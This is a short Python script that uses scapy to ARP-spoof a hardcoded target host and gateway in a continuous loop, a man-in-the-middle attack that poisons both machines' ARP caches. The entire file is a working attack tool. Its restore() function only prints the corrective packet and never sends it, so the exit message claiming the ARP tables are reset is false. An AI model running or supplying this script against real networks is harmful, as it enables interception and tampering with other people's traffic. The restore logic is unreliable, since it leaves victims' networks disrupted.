import scapy.all as scapy
import time
import sys

target_ip = "192.168.1.189"
gateway_ip = "192.168.1.1"


def get_mac(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
 
    

def spoof(target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 , pdst= target_ip, hwdst= target_mac , psrc=spoof_ip)
    scapy.send(packet , verbose=False) #vebose addition info

def restore(destionation_ip, source_ip):
    destionation_mac = get_mac(destionation_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst = destionation_ip , hwdst = destionation_mac , psrc = source_ip , hwsrc = source_mac)
    print(packet.show())
    print(packet.summary())


sent_packets_count = 0
try:
    while True:
        spoof(target_ip , gateway_ip) 
        spoof(gateway_ip ,target_ip) 
        sent_packets_count = sent_packets_count + 2 
        print("\r[+] Packets sent :" + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + c ...Quitting. Resetting Arp Tables ....")
    restore(target_ip , gateway_ip)
    restore(gateway_ip , target_ip)
